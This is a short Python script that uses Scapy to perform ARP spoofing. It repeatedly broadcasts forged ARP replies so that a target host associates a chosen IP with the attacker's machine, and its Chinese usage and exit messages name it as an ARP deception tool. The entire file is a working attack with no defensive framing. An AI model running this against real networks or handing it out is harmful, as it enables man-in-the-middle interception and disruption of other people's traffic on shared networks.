# -*- coding: utf-8 -*-
import sys
import time

from scapy.all import *
def arpspoof(target,ip):
    try:
        pkt=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=target,psrc=ip)
        sendp(pkt)

    except:
        return
def main():
    if len(sys.argv)!=3:
        print("使用方法：python arp.py 目标主机IP 冒充主机IP")
        sys.exit()
    target=str(sys.argv[1].strip())
    ip=str(sys.argv[2].strip())
    while True:
        try:
            arpspoof(target, ip)
            time.sleep(0.5)
        except KeyboardInterrupt:
            print("结束ARP欺骗")
            break


if __name__=='__main__':
    main()
